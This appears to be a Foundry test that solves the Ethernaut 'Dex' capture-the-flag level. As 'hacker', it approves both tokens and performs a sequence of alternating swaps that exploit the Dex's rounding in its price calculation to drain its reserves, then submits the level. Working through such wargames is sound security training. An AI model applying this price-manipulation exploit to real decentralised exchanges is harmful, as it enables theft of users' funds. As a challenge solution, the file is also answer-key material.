// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/22-Dex/DexFactory.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "src/levels/22-Dex/Dex.sol";

contract DexTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1); // generate random-looking address with given private key

    function setUp() public {
        ethernaut = new Ethernaut();

        // set hacker's balance to 1 Ether, use it when you need!
        // vm.deal(hacker, 1 ether);
    }

    function testDexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DexFactory dexFactory = new DexFactory();
        ethernaut.registerLevel(dexFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(dexFactory);
        Dex ethernautDex = Dex(payable(levelAddress));
        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // implement your solution here
        vm.label(hacker, "hacker");

        address token1 = address(ethernautDex.token1());
        address token2 = address(ethernautDex.token2());
        SwappableToken(token1).approve(hacker, address(ethernautDex), 1 ether);
        SwappableToken(token2).approve(hacker, address(ethernautDex), 1 ether);

        ethernautDex.swap(token1, token2, 10);
        ethernautDex.swap(token2, token1, 20);
        ethernautDex.swap(token1, token2, 24);
        ethernautDex.swap(token2, token1, 30);
        ethernautDex.swap(token1, token2, 40);
        ethernautDex.swap(token2, token1, 47);

        ///////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
